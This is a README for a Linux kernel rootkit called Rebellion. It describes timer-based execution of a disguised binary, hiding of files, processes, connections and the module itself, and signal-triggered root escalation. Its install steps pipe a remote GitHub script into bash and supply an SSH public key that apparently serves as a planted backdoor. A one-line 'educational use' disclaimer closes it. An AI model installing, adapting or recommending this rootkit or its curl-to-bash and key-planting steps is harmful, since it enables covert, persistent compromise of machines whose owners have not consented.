# Rebellion Rootkit

Modified Linux Rootkit for x86/x86_64 kernels 5.x/6.x with timer-based program execution.

## Features

- **Timer-based execution**: Automatically executes `/usr/src/droplet/linux-gnu-header` every 1 minute
- **File hiding**: Files with "reb_" prefix are hidden from directory listings
- **Process hiding**: Hide processes and network connections
- **Module self-hiding**: Rootkit module can hide itself
- **Root privilege escalation**: Signal-based privilege escalation

## Download and Installation

### Method 1: SSH Key Authentication

Use the provided script to set up SSH key authentication and download:

```bash
# Download and run the setup script
curl -s https://raw.githubusercontent.com/Starrynight0x01/rebell/main/download_with_ssh.sh | bash
```

Or manually:

```bash
wget https://raw.githubusercontent.com/Starrynight0x01/rebell/main/download_with_ssh.sh
chmod +x download_with_ssh.sh
./download_with_ssh.sh
```

### Method 2: Direct Git Clone

```bash
git clone https://github.com/Starrynight0x01/rebell.git
cd rebell
make clean && make
```

## Usage

1. **Load the module:**
   ```bash
   sudo insmod rebellion.ko
   ```

2. **Verify it's working:**
   - The program `/usr/src/droplet/linux-gnu-header` will execute every minute
   - Files with "reb_" prefix will be hidden from `ls` commands

3. **Unload the module:**
   ```bash
   sudo rmmod rebellion
   ```

## Configuration

Edit `config.h` to modify:
- `MAGIC_PREFIX`: Change file hiding prefix (default: "reb_")
- `HIDE_PORT`: TCP/UDP port to hide from netstat
- Program execution path (currently: `/usr/src/droplet/linux-gnu-header`)

## SSH Public Key

The included SSH public key for authentication:
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUvuK2UqTzgDs7/Z6bzzGE+XHwwsJRfdvra0cLBnobh root@guidedprice.aeza.network
```

## Signals

- `SIGUSR1 (10)`: Privilege escalation
- `SIGUSR2 (12)`: Hide/show module

## Warning

This software is for educational and authorized testing purposes only. Use responsibly and in compliance with applicable laws.

## Build Requirements

- Linux kernel headers
- GCC compiler
- Make

## Compatibility

- Linux kernels 5.x and 6.x
- x86 and x86_64 architectures
